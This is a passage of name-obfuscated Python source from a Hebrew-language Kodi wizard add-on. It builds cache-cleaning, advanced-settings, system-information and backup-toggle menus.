		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O00O000OO0O0O0O00 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2874
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2875
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OO00O00O00000OO00 .replace ('true',OO00O0OOO0OOOO00O ).replace ('false',O00OOO0O000O0O000 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2876
	if OO00O00O00000OO00 =='true':#line:2877
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O000O0O0OO0OOO0OO [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2878
		addFile ('--- ניקוי קאש בהפעלה: %s'%O0O000O0OO000O0O0 .replace ('true',OO00O0OOO0OOOO00O ).replace ('false',O00OOO0O000O0O000 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2879
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OOO000O0OO00O0OO0 .replace ('true',OO00O0OOO0OOOO00O ).replace ('false',O00OOO0O000O0O000 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2880
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OO000000O0OOOO00O .replace ('true',OO00O0OOO0OOOO00O ).replace ('false',O00OOO0O000O0O000 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2881
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2882
	addFile ('Include Video Cache in Clear Cache: %s'%O0OO00O0OOO0O00OO .replace ('true',OO00O0OOO0OOOO00O ).replace ('false',O00OOO0O000O0O000 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2883
	if O0OO00O0OOO0O00OO =='true':#line:2884
		addFile ('--- Include All Video Addons: %s'%OO00O0OOOO0O0O0O0 .replace ('true',OO00O0OOO0OOOO00O ).replace ('false',O00OOO0O000O0O000 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2885
		addFile ('--- Include Bob: %s'%O00OO0OOOO0O0OO0O .replace ('true',OO00O0OOO0OOOO00O ).replace ('false',O00OOO0O000O0O000 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2886
		addFile ('--- Include Phoenix: %s'%O0OO0O0OOOOO0O000 .replace ('true',OO00O0OOO0OOOO00O ).replace ('false',O00OOO0O000O0O000 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2887
		addFile ('--- Include Specto: %s'%O0000O0OO00O00O0O .replace ('true',OO00O0OOO0OOOO00O ).replace ('false',O00OOO0O000O0O000 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2888
		addFile ('--- Include Exodus: %s'%O000O0OO0000OO00O .replace ('true',OO00O0OOO0OOOO00O ).replace ('false',O00OOO0O000O0O000 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2889
		addFile ('--- Include Salts: %s'%OO00000OO00OO0000 .replace ('true',OO00O0OOO0OOOO00O ).replace ('false',O00OOO0O000O0O000 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2890
		addFile ('--- Include Salts HD Lite: %s'%OO0000O00OOOOO00O .replace ('true',OO00O0OOO0OOOO00O ).replace ('false',O00OOO0O000O0O000 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2891
		addFile ('--- Include One Channel: %s'%O00O0OOOO0OO00000 .replace ('true',OO00O0OOO0OOOO00O ).replace ('false',O00OOO0O000O0O000 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2892
		addFile ('--- Include Genesis: %s'%O00O00000O0O0OOO0 .replace ('true',OO00O0OOO0OOOO00O ).replace ('false',O00OOO0O000O0O000 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2893
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2894
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2895
	setView ('files','viewType')#line:2896
def advancedWindow (url =None ):#line:2898
	if not ADVANCEDFILE =='http://':#line:2899
		if url ==None :#line:2900
			OO0O0OO00OO0OOO0O =wiz .workingURL (ADVANCEDFILE )#line:2901
			O0OOO0000OO000O00 =uservar .ADVANCEDFILE #line:2902
		else :#line:2903
			OO0O0OO00OO0OOO0O =wiz .workingURL (url )#line:2904
			O0OOO0000OO000O00 =url #line:2905
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2906
		if os .path .exists (ADVANCED ):#line:2907
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2908
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2909
		if OO0O0OO00OO0OOO0O ==True :#line:2910
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2911
			O000000000O0OO0OO =wiz .openURL (O0OOO0000OO000O00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2912
			O0000O0OOOO00000O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O000000000O0OO0OO )#line:2913
			if len (O0000O0OOOO00000O )>0 :#line:2914
				for O0OOO0OO0OOOO00OO ,O000000O00O0O0000 ,url ,OOO00O000O0O0000O ,OOOO0O00OO00O00O0 ,O0OOO0O0OO00O00OO in O0000O0OOOO00000O :#line:2915
					if O000000O00O0O0000 .lower ()=="yes":#line:2916
						addDir ("[B]%s[/B]"%O0OOO0OO0OOOO00OO ,'advancedsetting',url ,description =O0OOO0O0OO00O00OO ,icon =OOO00O000O0O0000O ,fanart =OOOO0O00OO00O00O0 ,themeit =THEME3 )#line:2917
					else :#line:2918
						addFile (O0OOO0OO0OOOO00OO ,'writeadvanced',O0OOO0OO0OOOO00OO ,url ,description =O0OOO0O0OO00O00OO ,icon =OOO00O000O0O0000O ,fanart =OOOO0O00OO00O00O0 ,themeit =THEME2 )#line:2919
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2920
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OO0O0OO00OO0OOO0O )#line:2921
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2922
def writeAdvanced (OO0OOOO00O0000OO0 ,OOOO0OOO0OOOO0O00 ):#line:2924
	OOO0O0O00O0OO000O =wiz .workingURL (OOOO0OOO0OOOO0O00 )#line:2925
	if OOO0O0O00O0OO000O ==True :#line:2926
		if os .path .exists (ADVANCED ):O00O000O0O00OO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO0OOOO00O0000OO0 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2927
		else :O00O000O0O00OO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO0OOOO00O0000OO0 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2928
		if O00O000O0O00OO0OO ==1 :#line:2930
			O00OO00OOOO0OOOO0 =wiz .openURL (OOOO0OOO0OOOO0O00 )#line:2931
			O0OOO0OOO0O000O0O =open (ADVANCED ,'w');#line:2932
			O0OOO0OOO0O000O0O .write (O00OO00OOOO0OOOO0 )#line:2933
			O0OOO0OOO0O000O0O .close ()#line:2934
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2935
			wiz .killxbmc (True )#line:2936
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2937
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OOO0O0O00O0OO000O );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2938
def viewAdvanced ():#line:2940
	OO00OOO0OO0O00000 =open (ADVANCED )#line:2941
	O00OO000OOO00O0O0 =OO00OOO0OO0O00000 .read ().replace ('\t','    ')#line:2942
	wiz .TextBox (ADDONTITLE ,O00OO000OOO00O0O0 )#line:2943
	OO00OOO0OO0O00000 .close ()#line:2944
def removeAdvanced ():#line:2946
	if os .path .exists (ADVANCED ):#line:2947
		wiz .removeFile (ADVANCED )#line:2948
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2949
def showAutoAdvanced ():#line:2951
	notify .autoConfig ()#line:2952
def getIP ():#line:2954
	O00O0O0OOOOOOOO00 ='http://whatismyipaddress.com/'#line:2955
	if not wiz .workingURL (O00O0O0OOOOOOOO00 ):return 'Unknown','Unknown','Unknown'#line:2956
	OOOO0OOO0O0000O0O =wiz .openURL (O00O0O0OOOOOOOO00 ).replace ('\n','').replace ('\r','')#line:2957
	if not 'Access Denied'in OOOO0OOO0O0000O0O :#line:2958
		OO0OOOOO00OO00OO0 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OOOO0OOO0O0000O0O )#line:2959
		OO0000OO0OO000O00 =OO0OOOOO00OO00OO0 [0 ]if (len (OO0OOOOO00OO00OO0 )>0 )else 'Unknown'#line:2960
		O0O000OOO0OOOO00O =re .compile ('"font-size:14px;">(.+?)</td>').findall (OOOO0OOO0O0000O0O )#line:2961
		O00OOO00O0OOOOOOO =O0O000OOO0OOOO00O [0 ]if (len (O0O000OOO0OOOO00O )>0 )else 'Unknown'#line:2962
		OOO00O000OOOOOO0O =O0O000OOO0OOOO00O [1 ]+', '+O0O000OOO0OOOO00O [2 ]+', '+O0O000OOO0OOOO00O [3 ]if (len (O0O000OOO0OOOO00O )>2 )else 'Unknown'#line:2963
		return OO0000OO0OO000O00 ,O00OOO00O0OOOOOOO ,OOO00O000OOOOOO0O #line:2964
	else :return 'Unknown','Unknown','Unknown'#line:2965
def systemInfo ():#line:2967
	OOOOOOO000O0OO00O =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2981
	OOO0O000OOOO00OO0 =[];O0OOOOO000OOO0000 =0 #line:2982
	for O00O0O00000000000 in OOOOOOO000O0OO00O :#line:2983
		OOO0OO0000OOOOO00 =wiz .getInfo (O00O0O00000000000 )#line:2984
		OOOOOOOO00OOOOO00 =0 #line:2985
		while OOO0OO0000OOOOO00 =="Busy"and OOOOOOOO00OOOOO00 <10 :#line:2986
			OOO0OO0000OOOOO00 =wiz .getInfo (O00O0O00000000000 );OOOOOOOO00OOOOO00 +=1 ;wiz .log ("%s sleep %s"%(O00O0O00000000000 ,str (OOOOOOOO00OOOOO00 )));xbmc .sleep (1000 )#line:2987
		OOO0O000OOOO00OO0 .append (OOO0OO0000OOOOO00 )#line:2988
		O0OOOOO000OOO0000 +=1 #line:2989
	O0O00OOOOOOOO0O0O =OOO0O000OOOO00OO0 [8 ]if 'Una'in OOO0O000OOOO00OO0 [8 ]else wiz .convertSize (int (float (OOO0O000OOOO00OO0 [8 ][:-8 ]))*1024 *1024 )#line:2990
	O000OO000O0OOO0O0 =OOO0O000OOOO00OO0 [9 ]if 'Una'in OOO0O000OOOO00OO0 [9 ]else wiz .convertSize (int (float (OOO0O000OOOO00OO0 [9 ][:-8 ]))*1024 *1024 )#line:2991
	O0O00OOOOOO0O0OO0 =OOO0O000OOOO00OO0 [10 ]if 'Una'in OOO0O000OOOO00OO0 [10 ]else wiz .convertSize (int (float (OOO0O000OOOO00OO0 [10 ][:-8 ]))*1024 *1024 )#line:2992
	OOOO0000000OO00OO =wiz .convertSize (int (float (OOO0O000OOOO00OO0 [11 ][:-2 ]))*1024 *1024 )#line:2993
	OOO00O0O00O0O00OO =wiz .convertSize (int (float (OOO0O000OOOO00OO0 [12 ][:-2 ]))*1024 *1024 )#line:2994
	OO0OOO0O000OO0OO0 =wiz .convertSize (int (float (OOO0O000OOOO00OO0 [13 ][:-2 ]))*1024 *1024 )#line:2995
	O0O0OOO00000OOOO0 ,OO00OOOOOOO0O0OO0 ,OOOOO0OOO0OOO00OO =getIP ()#line:2996
	O0000O000O0O0OOOO =[];O0O00OOOO0OO0O0OO =[];OOO00OO0OOO00O000 =[];OO0OOO0O0OOOOOO00 =[];O00000000OO0O00O0 =[];O0OO0O0O00O0000OO =[];OOOOO0000O00O0OO0 =[]#line:2998
	O00O0000000OOOO0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3000
	for O0OOOO0OO00000000 in sorted (O00O0000000OOOO0O ,key =lambda OO00000O0OOO0000O :OO00000O0OOO0000O ):#line:3001
		OOO00OO0000OOO0O0 =os .path .split (O0OOOO0OO00000000 [:-1 ])[1 ]#line:3002
		if OOO00OO0000OOO0O0 =='packages':continue #line:3003
		O0OO00O00000OOO00 =os .path .join (O0OOOO0OO00000000 ,'addon.xml')#line:3004
		if os .path .exists (O0OO00O00000OOO00 ):#line:3005
			OOOO000OOOOO00OO0 =open (O0OO00O00000OOO00 )#line:3006
			OO0O0000OO0OO0000 =OOOO000OOOOO00OO0 .read ()#line:3007
			O0O00OOOOO000OOOO =re .compile ("<provides>(.+?)</provides>").findall (OO0O0000OO0OO0000 )#line:3008
			if len (O0O00OOOOO000OOOO )==0 :#line:3009
				if OOO00OO0000OOO0O0 .startswith ('skin'):OOOOO0000O00O0OO0 .append (OOO00OO0000OOO0O0 )#line:3010
				if OOO00OO0000OOO0O0 .startswith ('repo'):O00000000OO0O00O0 .append (OOO00OO0000OOO0O0 )#line:3011
				else :O0OO0O0O00O0000OO .append (OOO00OO0000OOO0O0 )#line:3012
			elif not (O0O00OOOOO000OOOO [0 ]).find ('executable')==-1 :OO0OOO0O0OOOOOO00 .append (OOO00OO0000OOO0O0 )#line:3013
			elif not (O0O00OOOOO000OOOO [0 ]).find ('video')==-1 :OOO00OO0OOO00O000 .append (OOO00OO0000OOO0O0 )#line:3014
			elif not (O0O00OOOOO000OOOO [0 ]).find ('audio')==-1 :O0O00OOOO0OO0O0OO .append (OOO00OO0000OOO0O0 )#line:3015
			elif not (O0O00OOOOO000OOOO [0 ]).find ('image')==-1 :O0000O000O0O0OOOO .append (OOO00OO0000OOO0O0 )#line:3016
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3018
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O000OOOO00OO0 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3019
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O000OOOO00OO0 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3020
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3021
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O000OOOO00OO0 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3022
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O000OOOO00OO0 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3023
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3025
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O000OOOO00OO0 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3026
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O000OOOO00OO0 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3027
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3029
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00OOOOOOOO0O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3030
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OO000O0OOO0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3031
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00OOOOOO0O0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3032
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3034
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0000000OO00OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3035
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O0O00O0O00OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3036
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOO0O000OO0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3037
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3039
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O000OOOO00OO0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3040
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOO00000OOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3041
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOOOOOO0O0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3042
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO0OOO0OOO00OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3043
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O000OOOO00OO0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3044
	O0O0OO00000OOOO0O =len (O0000O000O0O0OOOO )+len (O0O00OOOO0OO0O0OO )+len (OOO00OO0OOO00O000 )+len (OO0OOO0O0OOOOOO00 )+len (O0OO0O0O00O0000OO )+len (OOOOO0000O00O0OO0 )+len (O00000000OO0O00O0 )#line:3046
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O0O0OO00000OOOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3047
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO00OO0OOO00O000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3048
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OOO0O0OOOOOO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3049
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O00OOOO0OO0O0OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3050
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0000O000O0O0OOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3051
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00000000OO0O00O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3052
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOO0000O00O0OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3053
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OO0O0O00O0000OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3054
def Menu ():#line:3055
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3056
def saveMenu ():#line:3058
	O000O0OOO000000OO ='[COLOR yellow]מופעל[/COLOR]';O0OO0O0OO0OOO0O00 ='[COLOR blue]מבוטל[/COLOR]'#line:3060
	O00OO00OO0O0OO0OO ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3061
	OO00O0OO0O0000OOO ='true'if KEEPMOVIELIST =='true'else 'false'#line:3062
	OO0OOO0000OO0O0OO ='true'if KEEPINFO =='true'else 'false'#line:3063
	OO00OO000OOO000OO ='true'if KEEPSOUND =='true'else 'false'#line:3065
	OO0O0O00000OO0OOO ='true'if KEEPVIEW =='true'else 'false'#line:3066
	O0000O0000O00O0OO ='true'if KEEPSKIN =='true'else 'false'#line:3067
	OOO00O00OO0000O00 ='true'if KEEPSKIN2 =='true'else 'false'#line:3068
	OOO0O00OOOO00O000 ='true'if KEEPSKIN3 =='true'else 'false'#line:3069
	O0OOO00OOO000O0O0 ='true'if KEEPADDONS =='true'else 'false'#line:3070
	O00O0O00O0000000O ='true'if KEEPPVR =='true'else 'false'#line:3071
	OOOO00OOOO00O0O00 ='true'if KEEPTVLIST =='true'else 'false'#line:3072
	OOOO00O0OO0OOOO00 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3073
	OOOO000OO000O0O00 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3074
	OO000OO00OO00OO00 ='true'if KEEPHUBTV =='true'else 'false'#line:3075
	O00OOOO000000OOO0 ='true'if KEEPHUBVOD =='true'else 'false'#line:3076
	OOO000O0O000OOOOO ='true'if KEEPHUBSPORT =='true'else 'false'#line:3077
	OO0000O0O0O00000O ='true'if KEEPHUBKIDS =='true'else 'false'#line:3078
	O0O00O0O0O0OOO0OO ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3079
	OOO0O00OOOOOO000O ='true'if KEEPHUBMENU =='true'else 'false'#line:3080
	OOOOO0OOO00000000 ='true'if KEEPPLAYLIST =='true'else 'false'#line:3081
	O0OOOO0O000000OOO ='true'if KEEPTRAKT =='true'else 'false'#line:3082
	OO0O0OO00O0O0O00O ='true'if KEEPREAL =='true'else 'false'#line:3083
	O0OO0OO0OOO000O00 ='true'if KEEPRD2 =='true'else 'false'#line:3084
	OOOOO00OOO00OOO0O ='true'if KEEPTORNET =='true'else 'true'#line:3085
	OO000OO0000OOO00O ='true'if KEEPLOGIN =='true'else 'false'#line:3086
	OOO0OOOOO00OO0OO0 ='true'if KEEPSOURCES =='true'else 'false'#line:3087
	O0OOO0O0OO000OO00 ='true'if KEEPADVANCED =='true'else 'false'#line:3088
	OOOOO0O0OO0OO00OO ='true'if KEEPPROFILES =='true'else 'false'#line:3089
	OO00OOOOOO0O0OO00 ='true'if KEEPFAVS =='true'else 'false'#line:3090
	O00O0OO0OOOO00O0O ='true'if KEEPREPOS =='true'else 'false'#line:3091
	OOO0000000O000OO0 ='true'if KEEPSUPER =='true'else 'false'#line:3092
	O00O0OOO0O00OOOOO ='true'if KEEPWHITELIST =='true'else 'false'#line:3093
	OOOO000000OOOO0O0 ='true'if KEEPWEATHER =='true'else 'false'#line:3094
	if O00O0OOO0O00OOOOO =='true':#line:3098
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3099
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3100
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3101
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3102
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3103
	addFile ('%s התקנת קיר סרטים: '%O00OO00OO0O0OO0OO .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:3105
	addFile ('%s שמירת חשבון RD:  '%OO0O0OO00O0O0O00O .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3106
	addFile ('%s שמירת חשבון טראקט:  '%O0OOOO0O000000OOO .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3107
	addFile ('%s שמירת מועדפים:  '%OO00OOOOOO0O0OO00 .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3110
	addFile ('%s שמירת לקוח טלוויזיה:  '%O00O0O00O0000000O .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3111
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%OOOO00OOOO00O0O00 .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3112
	addFile ('%s שמירת אריח סרטים:  '%OOOO00O0OO0OOOO00 .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3113
	addFile ('%s שמירת אריח סדרות:  '%OOOO000OO000O0O00 .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3114
	addFile ('%s שמירת אריח טלויזיה:  '%OO000OO00OO00OO00 .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3115
	addFile ('%s שמירת אריח תוכן ישראלי:  '%O00OOOO000000OOO0 .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3116
	addFile ('%s שמירת אריח ספורט:  '%OOO000O0O000OOOOO .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3117
	addFile ('%s שמירת אריח ילדים:  '%OO0000O0O0O00000O .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3118
	addFile ('%s שמירת אריח מוסיקה:  '%O0O00O0O0O0OOO0OO .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3119
	addFile ('%s שמירת תפריט אריחים ראשי:  '%OOO0O00OOOOOO000O .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3120
	addFile ('%s שמירת כל האריחים בסקין:  '%O0000O0000O00O0OO .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3121
	addFile ('%s שמירת הגדרות מזג האוויר:  '%OOOO000000OOOO0O0 .replace ('true',O000O0OOO000000OO ).replace ('false',O0OO0O0OO0OOO0O00 ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3122
